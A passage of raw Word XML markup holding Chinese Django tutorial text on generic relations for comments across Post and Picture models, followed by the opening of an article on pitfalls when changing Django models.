        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>content_type: 内容类型，代表了模型的名字(比如Post, Picture)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="392DACF0" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>object_id: 传入对象的id</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27D68330" w14:textId="07900AD6" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>content_object: 传入的实例化对象，其包含两个属性content_type和object_id。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B738F8B" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>当你需要对某篇文章或某个图片进行评论时(建立评论关系), 你只需要将实例化的对象user, post或picture传入comment。这样实现了按需建立评论关系。首先你先需要实例化对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B56AFCC" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>user = User.objects.create_user(username='user1', password='2333')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57A2F8F4" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>post = Post.objects.create(author=user,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22358C4C"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title='title1',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B540969"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body='')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61F9FE20" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>picture = Picture.objects.create(author=user,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E96EA90"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image="default.png",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EB18775" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                                 caption='picture1')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BA6519E" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>然后在views或者shell里，你可以按如下代码建立评论关系。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46960A7E" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&gt;&gt;&gt; from foreign.models import Post, Picture, Common</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="051D536D" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&gt;&gt;&gt; from django.contrib.auth.models import User</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5116334B" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&gt;&gt;&gt; user = User.objects.get(username='user1')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BBAB503" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&gt;&gt;&gt; post = Post.objects.get(title='title1')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="147D6314" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&gt;&gt;&gt; c = Comment.objects.create(author=user, body='', content_object=post)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24BF1C18" w14:textId="3B4D031E" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&gt;&gt;&gt; picture = Picture.objects.get(caption='picuture1')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52A57CB0" w14:textId="0B0BE305" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&gt;&gt;&gt; c1 = Comment.objects.create(author=user, body='', content_object=picture)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31AD6014" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>然而上述创建评论的方式我们并不推荐。我们更希望直接从模型中获取或创建comment，我们只需在模型中创建一个与Comment的GenericRelation即可。注意该字段不会存储于数据库中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="634BA792" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们修改过的模型及创建和获取评论的代码如下所示:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F5ABE98" w14:textId="74877121" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.contrib.contenttypes.fields import GenericRelation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="686870BE" w14:textId="177F07CB" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class Post(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09BA07A9" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">  author = models.ForeignKey(User)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40C4A1AE" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">  title = models.CharField(max_length=75)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="527B6E65" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">  body = models.TextField(blank=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7375457F" w14:textId="70F14F98" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">  comments = GenericRelation('Comment')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6446FEE4" w14:textId="21772939" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class Picture(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12AD67BE" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">  author = models.ForeignKey(User)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2171A19E" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">  image = models.ImageField()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F51E9B7" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">  caption = models.TextField(blank=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="247FD79E" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">  comments = GenericRelation('Comment')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CD151B3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&gt;&gt;&gt; me = User.objects.get(username='myusername')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45422004" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>&gt;&gt;&gt; pic = Picture.objects.get(author=me)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EF728AB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&gt;&gt;&gt; pic.comments.create(author=me, body="Man, I'm cool!")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="577F7C79" w14:textId="14D3086E" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&gt;&gt;&gt; pic.comments.all()[&lt;Comment: "Man, I'm cool!"&gt;]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31F6C6AA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>值得注意的是，如果在Post中定义了GenericRelation，删除了一个post实例，在Comment中所有与post相关实例也会被删除。GenericForeignKey不支持设置on_delete参数。 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="455651D5" w14:textId="6AE0179D" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>因此，如果对级联删除不满意的话就不要设置GenericRelation。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="611CBD22" w14:textId="704BA0FD" w:rsidR="001C47AF" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">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Pr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="27"/>
          <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
        </w:rPr>
        <w:t>102</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:b/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="27"/>
          <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:hyperlink r:id="rId346" w:anchor="wechat_redirect" w:history="1">
        <w:r w:rsidR="001C47AF" w:rsidRPr="00016AA9">
          <w:rPr>
            <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
            <w:b/>
            <w:color w:val="4D4D4D"/>
            <w:sz w:val="30"/>
            <w:szCs w:val="27"/>
            <w:u w:color="B4C6E7" w:themeColor="accent1" w:themeTint="66"/>
          </w:rPr>
          <w:t>Django更改模型过程中易出现的问题及解决方案</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5F30B85F" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django更改模型过程中易出现的问题及解决方案</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B1E09C6" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>原创 大江狗 </w:t>
      </w:r>
      <w:hyperlink r:id="rId347" w:history="1">
        <w:r w:rsidRPr="00016AA9">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Python Web与Django开发</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> 2019-01-04</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3341DDA6" w14:textId="4AB2844E" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django项目中我们要经常根据项目的需要添加或删减一个模型(models)的字段，有时还要改变某个字段的数据类型，这时你可能会遇到各种意想不到的问题。小编我今天就尝试总结下Django更改模型过程中易出现的3种问题及解决方案。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00E0E51A" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>01</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EC1C7F9" w14:textId="77777777" w:rsidR="00016AA9" w:rsidRPr="00016AA9" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>假设我们有如下一个Person模型，这个模型有name和company两个字段。我们已经使用python manage.py migrate命令在数据库中生成了相应的数据表，而且数据表里已经有了一些数据，如John (Baidu), Max (Google)。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D00DFE0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class Person(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A2045E9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00016AA9" w:rsidP="00016AA9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00016AA9">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    name = models.CharField(max_length=20, verbose_name='name')</w:t>
      </w:r>
    </w:p>
